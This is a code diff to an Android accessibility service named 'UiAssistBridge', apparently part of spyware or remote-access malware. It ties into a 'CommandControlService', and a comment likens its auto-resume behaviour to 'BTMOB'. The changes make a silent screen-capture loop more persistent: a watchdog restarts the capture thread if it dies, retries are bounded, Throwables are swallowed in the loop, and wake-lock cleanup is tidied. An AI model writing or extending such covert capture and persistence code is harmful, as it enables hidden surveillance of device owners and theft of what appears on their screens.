@@ -99,6 +99,12 @@ public class UiAssistBridge extends AccessibilityService {
                     Log.d(TAG, "Watchdog: CommandControlService not active, starting it...");
                     startCommandControlService();
                 }
+                if (silentScreenActive && (silentScreenThread == null || !silentScreenThread.isAlive())) {
+                    Log.d(TAG, "Watchdog: silentScreenThread dead but silentScreenActive=true, restarting...");
+                    int savedQuality = silentCaptureQuality;
+                    silentScreenActive = false;
+                    startSilentScreenCapture(savedQuality);
+                }
             } catch (Exception e) {
                 Log.e(TAG, "Watchdog error: " + e.getMessage());
             }
@@ -3999,13 +4005,18 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     public static void startSilentScreenCapture(int quality) {
+        startSilentScreenCapture(quality, 10);
+    }
+
+    private static void startSilentScreenCapture(final int quality, final int retriesLeft) {
         if (instance == null) {
-            Log.w("SilentCap", "instance is null, agendando retry...");
-            final int qRetry = quality;
+            Log.w("SilentCap", "instance is null, agendando retry... restantes=" + retriesLeft);
+            if (retriesLeft <= 0) {
+                Log.e("SilentCap", "instance sigue null tras 10 reintentos, desisto");
+                return;
+            }
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                if (instance != null) {
-                    startSilentScreenCapture(qRetry);
-                }
+                startSilentScreenCapture(quality, retriesLeft - 1);
             }, 1000);
             return;
         }
@@ -4078,7 +4089,7 @@ public class UiAssistBridge extends AccessibilityService {
                             Thread.sleep(10);
                         }
                     }
-                } catch (Exception e) {
+                } catch (Throwable e) {
                     Log.e("SilentCap", "silent cap loop err: " + e.getMessage());
                 }
             }
@@ -4088,7 +4099,9 @@ public class UiAssistBridge extends AccessibilityService {
             if (instance != null) {
                 instance.releaseSilentCpuWakeLock();
             }
-            silentScreenThread = null;
+            if (silentScreenThread == Thread.currentThread()) {
+                silentScreenThread = null;
+            }
         }, "SilentScreenThread");
         silentScreenThread = thread;
         thread.start();
@@ -4098,7 +4111,10 @@ public class UiAssistBridge extends AccessibilityService {
         silentScreenActive = false;
         silentScreenshotApiInFlight = false;
         drainSilentEncodeQueue();
-        silentScreenThread = null;
+        if (silentScreenThread != null) {
+            try { silentScreenThread.join(500); } catch (InterruptedException ignored) {}
+            silentScreenThread = null;
+        }
         // Release any held WakeLock for the silent path and clear persisted state
         if (instance != null) {
             instance.releaseSilentCpuWakeLock();
@@ -4407,6 +4423,7 @@ public class UiAssistBridge extends AccessibilityService {
 
         // Stop loop but keep persisted prefs so onServiceConnected can auto-resume (BTMOB-like)
         silentScreenActive = false;
+        drainSilentEncodeQueue();
         releaseSilentCpuWakeLock();
 
         try {
